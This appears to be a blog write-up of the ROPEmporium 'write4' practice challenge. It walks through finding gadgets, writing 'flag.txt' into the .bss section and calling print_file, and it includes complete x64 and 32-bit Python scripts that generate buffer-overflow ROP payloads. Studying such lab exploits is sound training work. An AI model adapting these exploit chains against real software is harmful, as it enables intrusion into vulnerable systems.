---
title: "write4 | ROPEmporium [4]"
date: 2024-11-12T15:45:36+05:00
tldr: ROPEmporium - 4, write4 task writeup
toc: true
summary: "Functions themselves are in an external library we should call it from there. Imported files proves the command `rabin2 -i <binary>` "
tags: [writeup, ROPEmporium, ROP, chain, exploitation]
---
# write4

“write4” challenge, read the description of the task and then come here

---

Task: 

- The string `flag.txt` isn’t in binary, but we must call the function `print_file`, which prints the file’s content.

---

Functions themselves are in an external library we should call it from there. Imported files proves the command `rabin2 -i <binary>` 

![image.png](image.png)

It gives addresses.

Buffer overflow offset is the same, and `checksec`  security features of binary are also the same with the previous challenge (in short, this means that no randomization in memory will prevent us from doing ROPs)

---

## x64 - ROP Chain

We need to build the ROP chain:

- `pop rdi; ret`  - gadget to put the argument into a function
- `print_file@plt` - address to call it
- we need a section with a write permission address where we can write our string `flag.txt`
- And the gadget like  `mov [reg], reg`  to insert the flag into memory from the register
    - `[reg]`  - address which points to memory
    - `reg`  - value `flag.txt`  in binary format

## x64 - Gadgets

`pop rdi; ret`  - gadget found by command `rp++ -r3 --unique -f ./write4 | grep "pop rdi"` 

![image.png](image1.png)

`print_file@plt`  - addresses got by command `rabin2 -i ./write4` 

![image.png](image2.png)

---

we should place the string `flag.txt`  into memory, we search the sections with the command `readelf -S <binary>` which has permission write ( `W`  flag) in which we can write and read. One of them is `.bss` section.

![image.png](70544342-a83b-4b93-8819-d06197c489dc.png)

1. address of `.**bss**` 
2. **`.bss`** write and read(it is actually default permission for ELF sections) permissions is `.bss` section

We need a gadget to write the string `mov [reg], reg`

![image.png](image3.png)

Fortunately, we have one at address `0x400628`, in register `r14` will be the address where we will write (in our case `.bss` section’s address) and put the string itself in the `r15` register.

## x64 - More gadgets

We need one more gadget to put our address and value into `r14` and `r15`  registers.

![image.png](image4.png)

`pop r14;  pop r15;  ret;`  - this gadget fits excellent. 

- **`r14`** -  address `.bss`  writable section address `0x601038`
- **`r15`** - value b’flag.txt` which is 8 bytes and fits well in one slot

## x64 - Payload

```jsx
from struct import pack

pop_r14_r15      = 0x00400690
writable_section = 0x00601038
mov_ptr          = 0x00400628
pop_rdi          = 0x400693
print_plt        = 0x0000000000400510
ret = 0x4004e6

payload = b'A' * 40

# Write "flag.txt" to writable memory
payload += pack('<Q', pop_r14_r15)  # pop r14; pop r15; ret
payload += pack('<Q', writable_section)  # r14 = writable section
payload += b'flag.txt'  # r15 = "b flag.txt"
payload += pack('<Q', mov_ptr)  # mov qword ptr [r14], r15; ret

payload += pack('<Q', pop_rdi)
payload += pack('<Q', writable_section)
payload += pack('<Q', ret)
payload += pack('<Q', print_plt)

# Output the payload
with open("payload", "wb") as f:
    f.write(payload)

print("Payload written to 'payload'")
```

## x64 - Result

![image.png](image5.png)

# write4 32-bit

Here, because of address size is different, our string `flag.txt`  doesn't fit in our one 4-byte stack slot, which means we should divide it into two slots `flag` and `.txt` 

Here if we search for the gadget for inserting strings into memory with the same command `rp++ -r2 --unique -f ./write432 | grep "move"` , we find the same functionality gadget but with different registers

![image.png](image6.png)

`mov [edi], ebp; ret`  - gadget

- `edi`  - address writable section `.bss`
- `ebp`  - value

We insert the strings one by one if the `.bss`  section address is equal to `0x0804a020` , we put our first string `flag` at address `0x0804a020`, and the second string will be inserted at address `0x0804a020 + 4` because one stack slot size is 4-byte.

## x86-32 - Payload

```jsx
from struct import pack

pop_ebx          = 0x0804839d 
writable_section = 0x0804a020
mov_ptr          = 0x08048543 # mov  [edi], ebp ; ret ;
pop_edi_pop_ebp  = 0x080485aa # pop edi ; pop ebp ; ret ;
print_plt        = 0x080483d0 # print@plt 

payload = b'A' * 44

flag_part1 = b'flag'
flag_part2 = b'.txt'

# Write "flag.txt" to writable memory
payload += pack('<I', pop_edi_pop_ebp)
payload += pack('<I', writable_section)  # edi = writable section
payload += flag_part1           # b'flag' = ebp 
payload += pack('<I', mov_ptr)  # mov  [edi], ebp ; ret ;

payload += pack('<I', pop_edi_pop_ebp)                         
payload += pack('<I', writable_section + 4)  # edi = writable section
payload += flag_part2           # b'.txt' = ebp             
payload += pack('<I', mov_ptr)  # mov  [edi], ebp ; ret ;

payload += pack('<I', print_plt)
payload += pack('<I', 0x0)
payload += pack('<I', writable_section)

# Output the payload
with open("payload", "wb") as f:
    f.write(payload)

print("Payload written to 'payload'")
```

## x86-32 - Result

![image.png](image7.png)
